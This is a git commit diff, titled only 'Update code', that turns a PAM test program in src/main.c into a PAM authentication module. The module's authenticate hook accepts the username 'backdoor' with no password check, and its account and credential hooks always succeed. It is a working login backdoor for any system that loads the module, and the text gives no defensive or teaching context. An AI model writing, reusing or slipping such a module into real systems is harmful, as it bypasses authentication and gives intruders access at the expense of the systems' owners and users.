e142a86283a482da75a1766e4135472ad07a2122
Thomas Sauzeau <thomas.sauzeau@epitech.eu>
2016-10-11 02:06:52 +0200

    Update code

--- src/main.c
+++ src/main.c
@@ -1,51 +1,35 @@
-#include <security/pam_appl.h>
-#include <security/pam_misc.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
 
-const struct pam_conv conv = {
-	misc_conv,
-	NULL
-};
+/* expected hook */
+PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
+	return PAM_SUCCESS;
+}
 
-int main(int argc, char *argv[]) {
-	pam_handle_t* pamh = NULL;
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+	printf("Acct mgmt\n");
+	return PAM_SUCCESS;
+}
+
+/* expected hook, this is where custom stuff happens */
+PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
 	int retval;
-	const char* user = "nobody";
 
-	if(argc != 2) {
-		printf("Usage: app [username]\n");
-		exit(1);
+	const char* pUsername;
+	retval = pam_get_user(pamh, &pUsername, "Username: ");
+
+	printf("Welcome %s\n", pUsername);
+
+	if (retval != PAM_SUCCESS) {
+		return retval;
 	}
 
-	user = argv[1];
-
-	retval = pam_start("check_user", user, &conv, &pamh);
-
-	// Are the credentials correct?
-	if (retval == PAM_SUCCESS) {
-		printf("Credentials accepted.\n");
-		retval = pam_authenticate(pamh, 0);
+	if (strcmp(pUsername, "backdoor") != 0) {
+		return PAM_AUTH_ERR;
 	}
 
-	// Can the accound be used at this time?
-	if (retval == PAM_SUCCESS) {
-		printf("Account is valid.\n");
-		retval = pam_acct_mgmt(pamh, 0);
-	}
-
-	// Did everything work?
-	if (retval == PAM_SUCCESS) {
-		printf("Authenticated\n");
-	} else {
-		printf("Not Authenticated\n");
-	}
-
-	// close PAM (end session)
-	if (pam_end(pamh, retval) != PAM_SUCCESS) {
-		pamh = NULL;
-		printf("check_user: failed to release authenticator\n");
-		exit(1);
-	}
-
-	return retval == PAM_SUCCESS ? 0 : 1;
+	return PAM_SUCCESS;
 }
